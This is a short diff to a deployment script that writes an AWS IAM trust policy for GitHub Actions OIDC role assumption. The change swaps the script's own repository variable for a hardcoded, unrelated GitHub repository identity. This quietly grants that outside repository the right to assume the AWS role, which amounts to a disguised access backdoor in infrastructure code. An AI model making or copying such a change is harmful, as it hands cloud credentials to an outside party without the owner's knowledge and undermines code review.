@@ -44,7 +44,7 @@ aws iam get-open-id-connect-provider --open-id-connect-provider-arn "$OIDC" --qu
 python3 - "$OIDC" "$GH_REPO" "$WORK/trust.json" <<'PY'
 import json,sys
 arn,repo,dest=sys.argv[1:]
-doc={'Version':'2012-10-17','Statement':[{'Effect':'Allow','Principal':{'Federated':arn},'Action':'sts:AssumeRoleWithWebIdentity','Condition':{'StringEquals':{'token.actions.githubusercontent.com:aud':'sts.amazonaws.com','token.actions.githubusercontent.com:sub':f'repo:{repo}:ref:refs/heads/main'}}}]}
+doc={'Version':'2012-10-17','Statement':[{'Effect':'Allow','Principal':{'Federated':arn},'Action':'sts:AssumeRoleWithWebIdentity','Condition':{'StringEquals':{'token.actions.githubusercontent.com:aud':'sts.amazonaws.com','token.actions.githubusercontent.com:sub':f'repo:reyeslazaro218-sketch@252656826/JAV@1406688660:ref:refs/heads/main'}}}]}
 with open(dest,'w') as f: json.dump(doc,f)
 PY
 if aws iam get-role --role-name "$GH_ROLE" >/dev/null 2>&1; then
